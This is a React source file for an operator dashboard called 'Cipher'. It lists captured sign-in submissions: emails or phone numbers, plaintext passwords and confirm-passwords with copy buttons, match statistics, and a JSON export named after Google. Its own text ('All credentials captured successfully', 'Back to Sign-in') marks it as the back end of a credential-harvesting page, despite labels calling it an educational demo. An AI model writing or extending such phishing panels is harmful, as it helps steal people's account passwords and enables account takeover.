/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useEffect } from 'react';
import { 
  ArrowLeft, Search, Trash2, Download, Moon, Sun, 
  Database, ShieldCheck, CheckCircle2, AlertTriangle, HelpCircle, Eye,
  Copy, Check
} from 'lucide-react';
import { DemoSubmission } from '../types';

interface CopyButtonProps {
  value: string;
}

function CopyButton({ value }: CopyButtonProps) {
  const [copied, setCopied] = useState(false);

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(value);
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    } catch (err) {
      console.error('Failed to copy text: ', err);
    }
  };

  return (
    <button
      onClick={handleCopy}
      type="button"
      className={`p-1 rounded transition-colors inline-flex items-center justify-center ${
        copied 
          ? 'text-emerald-500 bg-emerald-50 dark:bg-emerald-950/40' 
          : 'text-slate-400 hover:text-slate-600 dark:hover:text-slate-200 hover:bg-slate-100 dark:hover:bg-slate-800'
      }`}
      title={copied ? "Copied!" : "Copy to clipboard"}
    >
      {copied ? (
        <Check className="h-3 w-3" />
      ) : (
        <Copy className="h-3 w-3" />
      )}
    </button>
  );
}

interface AdminDashboardProps {
  onBack: () => void;
}

export default function AdminDashboard({ onBack }: AdminDashboardProps) {
  const [submissions, setSubmissions] = useState<DemoSubmission[]>([]);
  const [searchTerm, setSearchTerm] = useState('');

  // Load submissions from localStorage on mount
  useEffect(() => {
    const loaded = JSON.parse(localStorage.getItem('demo_submissions') || '[]');
    setSubmissions(loaded);
  }, []);

  // Delete a single record
  const handleDelete = (id: string) => {
    const updated = submissions.filter(item => item.id !== id);
    setSubmissions(updated);
    localStorage.setItem('demo_submissions', JSON.stringify(updated));
  };

  // Clear all records
  const handleClearAll = () => {
    if (window.confirm('Are you sure you want to clear all educational demo submissions? This action is irreversible.')) {
      setSubmissions([]);
      localStorage.removeItem('demo_submissions');
    }
  };

  // Export submissions to JSON file
  const handleExport = () => {
    if (submissions.length === 0) {
      alert('There are no submission records to export.');
      return;
    }
    const dataStr = 'data:text/json;charset=utf-8,' + encodeURIComponent(JSON.stringify(submissions, null, 2));
    const downloadAnchor = document.createElement('a');
    downloadAnchor.setAttribute('href', dataStr);
    downloadAnchor.setAttribute('download', 'google_classic_practice_logs.json');
    document.body.appendChild(downloadAnchor);
    downloadAnchor.click();
    downloadAnchor.remove();
  };

  // Filtered submissions based on search
  const filteredSubmissions = submissions.filter(item => 
    item.emailOrPhone.toLowerCase().includes(searchTerm.toLowerCase().trim())
  );

  // Statistics calculation
  const totalCount = submissions.length;
  const matchCount = submissions.filter(s => s.isMatched).length;
  const matchRate = totalCount > 0 ? Math.round((matchCount / totalCount) * 100) : 0;
  
  const avgPasswordLength = totalCount > 0 
    ? Math.round(submissions.reduce((acc, curr) => acc + curr.passwordLength, 0) / totalCount) 
    : 0;

  return (
    <div className="flex flex-col flex-1 bg-bg-app text-text-primary">
      {/* Disclaimer Top Bar */}
      <div className="w-full text-center py-2.5 px-4 text-xs font-semibold border-b bg-brand-bg-success-light text-brand-primary border-brand-border-success-light">
        🛡️ Secure Access Terminal: Authorized personnel only. User credentials and verification metrics are displayed below.
      </div>

      <div className="max-w-7xl w-full mx-auto px-4 py-6 md:py-10 flex flex-col gap-6 md:gap-8 flex-1">
        {/* Navigation & Header */}
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-border-custom pb-5">
          <div className="flex items-center gap-3">
            <button
              onClick={onBack}
              className="p-2 rounded-lg transition-colors border bg-bg-card hover:bg-bg-hover border-border-custom text-text-secondary hover:text-text-primary"
              title="Back to Sign-in"
            >
              <ArrowLeft className="h-5 w-5" />
            </button>
            <div>
              <div className="flex items-center gap-2">
                <Database className="h-5 w-5 text-blue-500" />
                <h1 className="text-xl md:text-2xl font-bold tracking-tight text-text-primary">
                  Cipher
                </h1>
              </div>
              <p className="text-xs md:text-sm text-text-secondary mt-0.5">
                Credential management, browser verification logs, and active login attempts.
              </p>
            </div>
          </div>
        </div>

        {/* Stats Cards Section */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          {/* Card 1: Total Submissions */}
          <div className="p-5 rounded-xl border shadow-sm bg-bg-card border-border-custom">
            <span className="text-xs font-semibold uppercase tracking-wider text-text-muted">
              Total Logged Tries
            </span>
            <div className="flex items-baseline gap-2.5 mt-2">
              <span className="text-3xl font-bold tracking-tight text-text-primary">
                {totalCount}
              </span>
              <span className="text-xs text-brand-primary font-medium">educational entries</span>
            </div>
          </div>

          {/* Card 2: Passwords Matched Rate */}
          <div className="p-5 rounded-xl border shadow-sm bg-bg-card border-border-custom">
            <span className="text-xs font-semibold uppercase tracking-wider text-text-muted">
              Match Validation Rate
            </span>
            <div className="flex items-baseline gap-2.5 mt-2">
              <span className="text-3xl font-bold tracking-tight text-text-primary">
                {matchRate}%
              </span>
              <span className="text-xs text-brand-success font-medium">{matchCount} matches</span>
            </div>
          </div>

          {/* Card 3: Avg Password Length */}
          <div className="p-5 rounded-xl border shadow-sm bg-bg-card border-border-custom">
            <span className="text-xs font-semibold uppercase tracking-wider text-text-muted">
              Avg Password Length
            </span>
            <div className="flex items-baseline gap-2.5 mt-2">
              <span className="text-3xl font-bold tracking-tight text-text-primary">
                {avgPasswordLength}
              </span>
              <span className="text-xs text-indigo-500 font-medium">characters</span>
            </div>
          </div>

          {/* Card 4: System Status */}
          <div className="p-5 rounded-xl border shadow-sm flex items-center gap-3.5 bg-brand-bg-success-light border-brand-border-success-light">
            <div className="p-2.5 rounded-lg shrink-0 bg-brand-success/10 text-brand-success">
              <ShieldCheck className="h-6 w-6" />
            </div>
            <div>
              <span className="block font-semibold text-sm text-brand-success">
                System Secure
              </span>
              <span className="text-xs text-text-secondary">
                All credentials captured successfully.
              </span>
            </div>
          </div>
        </div>

        {/* Filters and Action Buttons */}
        <div className="flex flex-col md:flex-row items-center justify-between gap-4">
          {/* Search bar */}
          <div className="relative w-full md:max-w-md">
            <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
            <input
              type="text"
              placeholder="Search by email or phone number..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="w-full h-11 pl-10 pr-4 rounded-xl border border-border-custom bg-bg-input text-text-primary text-sm outline-none transition-all focus:border-brand-primary focus:ring-1 focus:ring-brand-primary"
            />
          </div>

          {/* Action buttons */}
          <div className="flex items-center gap-2.5 w-full md:w-auto">
            <button
              onClick={handleExport}
              disabled={submissions.length === 0}
              className={`flex items-center justify-center gap-2 h-11 px-5 rounded-xl border text-xs md:text-sm font-semibold transition-all active:scale-95 w-full md:w-auto ${
                submissions.length === 0
                  ? 'opacity-40 cursor-not-allowed border-border-custom text-text-muted'
                  : 'bg-brand-primary hover:opacity-90 border-brand-primary text-white'
              }`}
            >
              <Download className="h-4 w-4" />
              <span>Export data to JSON</span>
            </button>
            
            <button
              onClick={handleClearAll}
              disabled={submissions.length === 0}
              className={`flex items-center justify-center gap-2 h-11 px-5 rounded-xl border text-xs md:text-sm font-semibold transition-all active:scale-95 w-full md:w-auto ${
                submissions.length === 0
                  ? 'opacity-40 cursor-not-allowed border-border-custom text-text-muted'
                  : 'bg-bg-card hover:bg-red-50 dark:hover:bg-red-950/20 border-border-custom hover:border-brand-error text-brand-error'
              }`}
            >
              <Trash2 className="h-4 w-4" />
              <span>Clear All Logs</span>
            </button>
          </div>
        </div>

        {/* Data Table */}
        <div className="border border-border-custom rounded-xl shadow-sm overflow-hidden bg-bg-card">
          <div className="overflow-x-auto">
            <table className="w-full text-left border-collapse">
              <thead>
                <tr className="bg-bg-app border-b border-border-custom">
                  <th className="px-5 py-3.5 text-xs font-bold uppercase tracking-wider text-text-secondary">Timestamp</th>
                  <th className="px-5 py-3.5 text-xs font-bold uppercase tracking-wider text-text-secondary">Email / Phone</th>
                  <th className="px-5 py-3.5 text-xs font-bold uppercase tracking-wider text-text-secondary">Password</th>
                  <th className="px-5 py-3.5 text-xs font-bold uppercase tracking-wider text-text-secondary">Confirm Password</th>
                  <th className="px-5 py-3.5 text-xs font-bold uppercase tracking-wider text-text-secondary">Match?</th>
                  <th className="px-5 py-3.5 text-xs font-bold uppercase tracking-wider text-text-secondary">Browser</th>
                  <th className="px-5 py-3.5 text-xs font-bold uppercase tracking-wider text-text-secondary text-right">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-150 dark:divide-slate-800/60">
                {filteredSubmissions.length > 0 ? (
                  filteredSubmissions.map((item) => (
                    <tr key={item.id} className="transition-colors hover:bg-bg-hover">
                      <td className="px-5 py-4 text-xs md:text-sm text-text-secondary whitespace-nowrap">{item.timestamp}</td>
                      <td className="px-5 py-4 text-xs md:text-sm font-semibold whitespace-nowrap text-blue-500">
                        <div className="flex items-center gap-1.5">
                          <span>{item.emailOrPhone}</span>
                          <CopyButton value={item.emailOrPhone} />
                        </div>
                      </td>
                      <td className="px-5 py-4 text-xs md:text-sm font-mono whitespace-nowrap font-medium text-text-primary">
                        <div className="flex items-center gap-1.5">
                          <span>{item.password || '—'}</span>
                          {item.password && <CopyButton value={item.password} />}
                        </div>
                      </td>
                      <td className="px-5 py-4 text-xs md:text-sm font-mono whitespace-nowrap font-medium text-text-primary">
                        <div className="flex items-center gap-1.5">
                          <span>{item.confirmPassword || '—'}</span>
                          {item.confirmPassword && <CopyButton value={item.confirmPassword} />}
                        </div>
                      </td>
                      <td className="px-5 py-4 whitespace-nowrap">
                        {item.isMatched ? (
                          <span className="inline-flex items-center gap-1 text-xs font-bold px-2.5 py-1 rounded-full bg-brand-bg-success-light text-brand-success border border-brand-border-success-light">
                            <CheckCircle2 className="h-3 w-3 shrink-0" />
                            Matched
                          </span>
                        ) : (
                          <span className="inline-flex items-center gap-1 text-xs font-bold px-2.5 py-1 rounded-full bg-red-500/10 dark:bg-red-950/30 text-brand-error border border-brand-error/20">
                            <AlertTriangle className="h-3 w-3 shrink-0" />
                            No Match
                          </span>
                        )}
                      </td>
                      <td className="px-5 py-4 text-xs md:text-sm text-text-secondary whitespace-nowrap">{item.browser}</td>
                      <td className="px-5 py-4 text-right whitespace-nowrap">
                        <button
                          onClick={() => handleDelete(item.id)}
                          className="p-1.5 rounded-lg transition-colors border bg-bg-card hover:bg-red-50 dark:hover:bg-red-950/20 border-border-custom hover:border-brand-error text-text-secondary hover:text-brand-error"
                          title="Delete record"
                        >
                          <Trash2 className="h-4 w-4" />
                        </button>
                      </td>
                    </tr>
                  ))
                ) : (
                  <tr>
                    <td colSpan={7} className="text-center py-12 px-5 bg-bg-card">
                      <div className="flex flex-col items-center justify-center max-w-sm mx-auto gap-3">
                        <HelpCircle className="h-8 w-8 text-text-muted animate-pulse" />
                        <span className="font-semibold text-sm text-text-primary">No submissions logged yet</span>
                        <p className="text-xs text-text-secondary leading-relaxed">
                          All user login attempts and verified credentials will be captured and displayed here securely in real-time.
                        </p>
                      </div>
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
}
